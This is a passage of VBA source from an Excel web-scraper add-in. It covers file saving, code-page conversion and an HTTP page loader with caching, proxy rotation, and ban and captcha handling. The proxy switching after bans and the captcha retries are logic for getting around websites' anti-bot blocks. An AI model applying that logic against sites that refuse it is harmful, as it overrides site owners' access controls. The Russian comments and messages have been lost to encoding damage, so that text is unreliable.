    On Error Resume Next: Err.Clear
    Dim ff As Integer
    SaveToFile = True
    ff = FreeFile()
    Open sFile For Output As #ff
    Print #ff, sText
    Close #ff
    SaveToFile = Err = 0
End Function

Function ConvertCodePage(src As String, inPage As Long, outPage As Long) As String
    On Error GoTo ErrorHandler
    Dim buf As String
    Dim Size As Long
    Size = MultiByteToWideChar(inPage, 0&, src, Len(src), 0&, 0&)
    If Size > 0 Then
        buf = String$(Size, 0)
        Size = MultiByteToWideChar(inPage, 0&, src, Len(src), StrPtr(buf), Len(src))
        Size = WideCharToMultiByte(outPage, 0&, StrPtr(buf), Size, ByVal 0&, 0&, 0&, 0&)
        If Size > 0 Then
            ConvertCodePage = String$(Size, 0)
            Size = WideCharToMultiByte(outPage, 0&, StrPtr(buf), Size, ConvertCodePage, LenB(ConvertCodePage), 0&, 0&)
            If Size <> 0 Then
                If Len(ConvertCodePage) <> Size Then ConvertCodePage = Left$(ConvertCodePage, Size)
            End If
        End If
    End If
    Exit Function
ErrorHandler:
    Debug.Print Now, Err, "Parser.ConvertCodePage", "String:", src
End Function

Attribute VB_Name = "mod_DOWNLOAD"
'---------------------------------------------------------------------------------------
' Module        : mod_DOWNLOAD
' Author        : Igor Vakhnenko            Date: 21.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Public IE As SHDocVw.InternetExplorer, wHTTP As WinHttpRequest
Public RequestLastTime As Long        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public StopCaptchaRequests As Boolean

Public Type QUERY_RESULT
    text As String        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| HTML |fffd||fffd||fffd|)
    URL As String        ' URL, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    StatusCode As Long        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Time As Long        ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    FromCache As Boolean        ' TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
End Type

Function http() As WinHttpRequest
    On Error Resume Next
    If wHTTP Is Nothing Then Set wHTTP = New WinHttpRequest
    Set http = wHTTP
End Function

Function GetIE() As SHDocVw.InternetExplorer
    On Error Resume Next
    Set GetIE = IE
End Function

Function DownloadFile_FromURL(ByVal URL$, ByVal LocalPath$, Optional ByVal DisableCache As Boolean = False) As Boolean
    On Error Resume Next
    Kill LocalPath$
    DoEvents
    If DisableCache Then Randomize: URL$ = URL$ & IIf(InStr(1, URL, "?") > 0, "&", "?") & "rnd=" & Left(Rnd(Now) * 1E+15, 10)
    DownloadFile_FromURL = URLDownloadToFile(0, URL$, LocalPath$, 0, 0) = 0
    DoEvents
End Function


Function LoadFromURL_HTML(ByVal RequestURL$, Optional ByRef WP As WebsiteParser, _
        Optional ByVal Encoding$ = "", Optional ByVal PostData$ = "", Optional ByVal CacheMode$ = "") As String
    On Error Resume Next
    Dim CacheFilename$, time1 As Long, time2 As Long, FSO As Object, ts As Object, RequestNextTime As Long, t As Double, Pause&, NonDirectQuery As Boolean
    Dim CacheFolder$, Timeout&, UseCache As Boolean, WriteCache As Boolean, UseCacheBefore As Boolean, txt_captcha$, AAset_NAME_ONCAPTCHA$, ProxyAttemptsCount&
    Dim POST As Boolean, ResponseHeaders$, PageRealEncoding$, DirectDownloadResult, ResponseHeadersSuffix$, RetryCount&, CaptchaAttemptsCount&
    Dim ProxyAddressBefore$, ProxyAddressAfter$, ProxyChangeInfo$
    
    RequestURL$ = Replace(RequestURL$, vbNewLine, ""): RequestURL$ = Replace(RequestURL$, vbLf, "")
    PageLoadRequested RequestURL$
    
    POST = PostData$ <> ""
    ParserVariables.item("%FirstHttpStatusCode%") = ""
    ParserVariables.item("%LastHttpStatusCode%") = ""
    ParserVariables.item("%LastRedirectURL%") = ""
    
    
    If WP Is Nothing Then
        If RunningParser Is Nothing Then
            Set WP = New WebsiteParser: WP.Options.UseCache = 0
        Else
            Set WP = RunningParser
        End If
    End If
    Timeout& = WP.Options.RequestTimeout
    
    '    If WP.Options.UseCache Then CacheFolder$ = WP.GetCacheFolderPath
    '    UseCache = (Len(CacheFolder$) > 0) And FolderExists(CacheFolder$) And (Not POST)
    '    If CacheMode$ = "|fffd||fffd|" Or CacheMode$ = "yes" Then UseCache = True: CacheFolder$ = WP.GetCacheFolderPath
    '    If CacheMode$ = "|fffd||fffd||fffd|" Or CacheMode$ = "no" Then UseCache = False
    '    WriteCache = UseCache: If CacheMode$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" Or CacheMode$ = "write" Then WriteCache = True: CacheFolder$ = WP.GetCacheFolderPath
    
    If Len(CacheMode$) Then    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        
        Select Case CacheMode$
            Case "|fffd||fffd||fffd|", "no"
                UseCache = False: WriteCache = False
            Case "|fffd||fffd|", "yes"
                UseCache = True: WriteCache = True
            Case "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "write"
                UseCache = False: WriteCache = True
        End Select
        
    Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        
        Select Case WP.Options.UseCache
            Case 0
                UseCache = False: WriteCache = False
            Case 1
                UseCache = True: WriteCache = True
            Case 2
                UseCache = False: WriteCache = True
        End Select
        
    End If
    
    If UseCache Or WriteCache Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        CacheFolder$ = WP.GetCacheFolderPath    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        If (Len(CacheFolder$) = 0) Or Not (FolderExists(CacheFolder$)) Or (POST And (CacheMode$ = "")) Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
            ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            UseCache = False: WriteCache = False
        End If
    End If
    UseCacheBefore = UseCache    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    'Debug.Print UseCache, WriteCache, RequestURL$
    
    
Label_LoadFromURL:
    
    If UseCache Or WriteCache Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Set FSO = CreateObject("scripting.filesystemobject")
        CacheFilename$ = CacheFolder$ & IIf(POST, "POST", "HTML") & IIf(Encoding$ = "", "", "(" & Encoding$ & ")") & "=" & _
            FWF.Replace_symbols(Replace(Replace(RequestURL$ & IIf(POST, "?" & PostData$, ""), "http://", ""), "/", "|fffd|")) & ".txt"
    End If
    
    If UseCache Then
        time1 = GetTickCount
        If FileExists(CacheFilename$) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
            Set ts = FSO.OpenTextFile(CacheFilename$, 1, True, True)
            LoadFromURL_HTML = ts.ReadAll        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            ts.Close
            Set ts = Nothing: Set FSO = Nothing
            time2 = GetTickCount
            http.Abort    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            
            If InStr(1, LoadFromURL_HTML, "<ResponseHeaders>") > 0 Then
                ResponseHeadersFromCache = ""
                ResponseHeadersFromCache = Split(LoadFromURL_HTML, "<ResponseHeaders>")(UBound(Split(LoadFromURL_HTML, "<ResponseHeaders>")))
                ResponseHeadersFromCache = Split(ResponseHeadersFromCache, "</ResponseHeaders>")(0)
                
                LoadFromURL_HTML = Split(LoadFromURL_HTML, "<ResponseHeaders>")(0)
            End If
            
            'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & RequestURL$
            '  Debug.Print "    |fffd||fffd| |fffd||fffd||fffd||fffd|,  |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|: " & Len(LoadFromURL_HTML); ",  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & time2 - time1 & " |fffd||fffd|."
            
            If WP.CaptchaDetected(LoadFromURL_HTML) Then
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                UseCache = False
                If WP.Options.CaptchaShowPopup Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| <a href='" & RequestURL$ & "'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</a>" & _
                    vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Attention
                GoTo Label_LoadFromURL
            End If
            
            ParserVariables.item("%LastHttpStatusCode%") = "cache"
            Exit Function
        End If
    Else
        ResponseHeadersFromCache = ""
    End If
    
    If WP.Options.Pause Then WP.WaitAPause
    
    If RequestURL$ Like "*[|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then RequestURL$ = ConvertURLtoPunycode(RequestURL$)
    
    time1 = GetTickCount
    
    With http
        
        If Encoding$ Like "direct" Then
            Dim ResponseFilename$, FileContent$: ResponseFilename$ = Environ("tmp") & "\response_direct.txt"
            'Kill ResponseFilename$
            DirectDownloadResult = URLDownloadToFile(0, RequestURL$, ResponseFilename$, 0, 0)
            If DirectDownloadResult = 0 Then
                LoadFromURL_HTML = ReadTXTfile(ResponseFilename$)
                If InStr(1, LoadFromURL_HTML, "windows-1251") = 0 Then
                    ChangeFileCharset ResponseFilename$, "windows-1251", "utf-8"
                    LoadFromURL_HTML = ReadTXTfile(ResponseFilename$)
                End If
                ParserVariables.item("%LastHttpStatusCode%") = "ok"
            Else
                LoadFromURL_HTML = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & GetURLerrorDescription(DirectDownloadResult)
                WP.SetError "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "!URL<br />" & GetURLerrorDescription(DirectDownloadResult), RequestURL$, False
                ParserVariables.item("%LastHttpStatusCode%") = "err"
            End If
        Else
            
            .Open IIf(POST, "POST", "GET"), RequestURL$, True
            If WP.Options.UseClientCertificate Then .SetClientCertificate WP.Options.ClientCertificateName
            WP.UpdateWinHttpProxySettings ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2019
            
            .SetTimeouts 5000, 200000, 200000, 200000        '        If timeout& > 25 Then .SetTimeouts 5000, (timeout& + 5) * 1000, (timeout& + 5), (timeout& + 5)
            
            AddRequestHeadersFromStore
            If POST Then AddStandartHeadersIntoStore RequestURL$, IIf(PostData$ Like "{*}", "application/json", "")          ' overwriting some old headers
            If Not CookiesStore Is Nothing Then http.SetRequestHeader "Cookie", GetCookiesFromStore
            
            .Option(WinHttpRequestOption_EnableHttpsToHttpRedirects) = True
            If POST Then .Send (PostData$) Else .Send
            DoEvents
            
            If Not .WaitForResponse(Timeout&) Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                If StopMacro Then Exit Function
                
                If WP.Proxy.Enabled Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    
                    If ProxyAttemptsCount& <= WP.Proxy.Attempts Then
                        
                        ProxyAttemptsCount& = ProxyAttemptsCount& + 1
                        If WP.Proxy.ShowPopup Then AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b>" & vbNewLine & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Timeout& & " |fffd||fffd||fffd|.) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                            vbNewLine & "<a href='" & RequestURL$ & "'>" & CropURL(RequestURL$, 30) & "</a>" & _
                            vbNewLine & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.", bt_Attention
                        
                        ProxyAddressBefore$ = "": ProxyAddressAfter$ = ""
                        ProxyAddressBefore$ = WP.Proxy.ActiveProxy.Address
                        WP.Proxy.UpdateActiveProxyInfo False    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        ProxyAddressAfter$ = WP.Proxy.ActiveProxy.Address
                        
                        If ProxyAddressBefore$ = ProxyAddressAfter$ Then
                            ProxyChangeInfo$ = "<b>|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b>"
                        ElseIf ProxyAddressAfter$ = "" Then
                            ProxyChangeInfo$ = "<b>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</b>"
                        Else
                            ProxyChangeInfo$ = "<b>|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:</b> <span style='font-size: xx-small;'>" & ProxyAddressBefore$ & " -> " & ProxyAddressAfter$ & "</span>"
                        End If
                        
                        
                        GoTo Label_LoadFromURL ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        
                    Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        
                        If WP.Proxy.ShowPopup Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & WP.Proxy.Attempts & _
                            ") |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & "<a href='" & RequestURL$ & "'>" & CropURL(RequestURL$, 30) & "</a>", bt_Warning
                        
                        WP.Proxy.UpdateActiveProxyInfo False    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        
                        Exit Function
                        
                    End If
                    
                Else    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Select Case WP.SetError("|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & IIf(POST, "|fffd||fffd| POST-|fffd||fffd||fffd||fffd||fffd||fffd| ", "") & "|fffd||fffd| " & Timeout& & " |fffd||fffd||fffd|.", _
                            "!URL", RequestURL$, True, RetryCount&, "/manuals/errors/NoServerResponse")
                        Case vbIgnore        ' do nothing
                        Case vbAbort: StopMacro = True
                        Case vbRetry: Timeout& = Timeout& + 3: GoTo Label_LoadFromURL
                    End Select
                    ParserVariables.item("%LastHttpStatusCode%") = "timeout"
                    Exit Function
                End If
                
            End If
            
            'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & RequestURL$
            ' Debug.Print Err.Description
            ' MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & UBound(HTTP.ResponseBody)
            
            ParserVariables.item("%LastHttpStatusCode%") = .Status
            DoEvents
            If Encoding$ = "" Then
                PageRealEncoding$ = "": PageRealEncoding$ = Split(.GetResponseHeader("Content-Type"), "charset=")(1)
                If PageRealEncoding$ = "" Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Dim PageEncoding$
                    PageEncoding$ = GetTags(.ResponseText, "meta", "AttributesPattern", "charset=", "TagHeaderOnly 1")
                    PageEncoding$ = Split(PageEncoding$, "charset=")(1)
                    PageEncoding$ = Split(PageEncoding$, " ")(0)
                    PageEncoding$ = Split(PageEncoding$, ">")(0)
                    PageRealEncoding$ = PageEncoding$
                End If
                If PageRealEncoding$ Like "*utf-8*" Then Encoding$ = "utf-8"
                If PageRealEncoding$ Like "*1251*" Then Encoding$ = "windows-1251"
            End If
            
            If Len(Encoding$) Then
                If Encoding$ = "gzip" Then
                    LoadFromURL_HTML = DecompressGZIP(.ResponseBody)
                Else
                    LoadFromURL_HTML = GetResponse(.ResponseBody, Encoding$)
                End If
            Else
                LoadFromURL_HTML = .ResponseText
            End If
            NonDirectQuery = True
            'MsgBox Right(LoadFromURL_HTML, 50), , "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Len(LoadFromURL_HTML)
            LoadFromURL_HTML = Replace(LoadFromURL_HTML, Chr(0), "")
            
            time2 = GetTickCount
            
            If WP.Proxy.Enabled Then
                ProxyAddressBefore$ = "": ProxyAddressAfter$ = "": ProxyAddressBefore$ = WP.Proxy.ActiveProxy.Address
                
                If .Status = 407 Then
                    AddBalloon "<b style='color: red;'>|fffd||fffd||fffd||fffd||fffd||fffd| 407</b> (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|). <b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.</b>" & vbNewLine & _
                        "<span style='font-size: small;'>" & WP.Proxy.ActiveProxy.Address & "</span>", bt_Warning, True
                    
                    WP.Proxy.ActiveProxy.Locked = True
                    WP.Proxy.SwitchToNext True
                    GoTo Label_LoadFromURL
                End If
                
                If WP.BanDetected(LoadFromURL_HTML) Then
                    ProxyAddressAfter$ = WP.Proxy.ActiveProxy.Address
                    
                    If ProxyAttemptsCount& <= WP.Proxy.Attempts Then
                        ProxyAttemptsCount& = ProxyAttemptsCount& + 1
                        If WP.Proxy.ShowPopup Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & "<a href='" & RequestURL$ & "'>" & _
                            CropURL(RequestURL$, 30) & "</a>" & vbNewLine & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                            IIf(ProxyAddressBefore$ = ProxyAddressAfter$, "<b>|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b>", _
                            "<b>|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:</b> " & ProxyAddressBefore$ & " -> " & ProxyAddressAfter$ & ""), bt_Attention
                        GoTo Label_LoadFromURL
                    Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                        If WP.Proxy.ShowPopup Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & WP.Proxy.Attempts & _
                            ") |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & "<a href='" & RequestURL$ & "'>" & CropURL(RequestURL$, 30) & "</a>", bt_Warning
                    End If
                End If
            End If
            
Label_CheckCaptcha:
            
            If StopMacro Then Exit Function
            If WP.CaptchaDetected(LoadFromURL_HTML) Then
                If CaptchaAttemptsCount& <= WP.Options.CaptchaAttempts Then
                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ACTION_SET_NAME_ONCAPTCHA, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    
                    ParserVariables.item("%" & CAPTCHA_URL_VAR_NAME$ & "%") = RequestURL$
                    AAset_NAME_ONCAPTCHA$ = WP.Options.CaptchaHandler
                    
                    If WP.AASets.Exists(AAset_NAME_ONCAPTCHA$) Then
                        CaptchaAttemptsCount& = CaptchaAttemptsCount& + 1
                        
                        If WP.Options.CaptchaShowPopup And (CaptchaAttemptsCount& = 1) Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                            vbNewLine & "<a href='" & RequestURL$ & "'>" & _
                            CropURL(RequestURL$, 30) & "</a>" & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Information
                        
                        If WP.Options.CaptchaShowPopup And (CaptchaAttemptsCount& > 1) Then
                            AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & CaptchaAttemptsCount& & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", bt_Information
                        End If
                        
                        txt_captcha$ = LoadFromURL_HTML
                        StopCaptchaRequests = True
                        WP.AASets.GetItemByName(AAset_NAME_ONCAPTCHA$).Execute txt_captcha$
                        StopCaptchaRequests = False
                        
                        
                        If UseCacheBefore Then WriteCache = True    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        
                        If WP.Options.CaptchaReloadPage Then
                            GoTo Label_LoadFromURL
                        Else
                            LoadFromURL_HTML = txt_captcha$
                            GoTo Label_CheckCaptcha
                        End If
                        
                    Else
                        AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b>: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & _
